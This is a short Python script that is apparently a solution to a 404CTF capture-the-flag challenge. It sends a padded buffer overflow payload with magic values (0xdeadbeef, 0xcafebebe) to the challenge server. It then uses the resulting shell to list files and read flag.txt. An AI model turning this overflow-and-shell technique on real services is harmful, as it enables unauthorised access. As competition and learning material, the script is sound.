import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge.404ctf.fr', 32458))

s.send(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\xbe\xbe\xfe\xca\n')
data = s.recv(1024)
print(data.decode('utf-8'))

s.send(b'ls -la\n')
data = s.recv(1024)
print(data.decode('utf-8'))

s.send(b'cat flag.txt\n')
data = s.recv(1024)
print(data.decode('utf-8'))

s.close()
